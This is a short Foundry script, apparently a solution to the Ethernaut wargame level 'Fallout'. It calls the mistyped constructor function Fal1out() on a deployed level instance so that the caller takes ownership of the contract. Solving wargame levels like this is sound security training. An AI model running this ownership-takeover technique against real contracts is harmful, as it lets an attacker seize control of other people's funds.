// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import {Script, console} from "forge-std/Script.sol";
import {Fallout} from "../src/Lv-02/Fallout.sol";

contract FalloutScript is Script {
    function run() public {
        vm.startBroadcast();
        //REPLACE ADDRESS WITH YOUR OWN FALLOUT INSTANCE ADDRESS
        Fallout _fallout = Fallout(0x7799443F7A6Df1fFe6a47fb465b53bc23C178D91);

          _fallout.Fal1out();
        vm.stopBroadcast();
    }
}
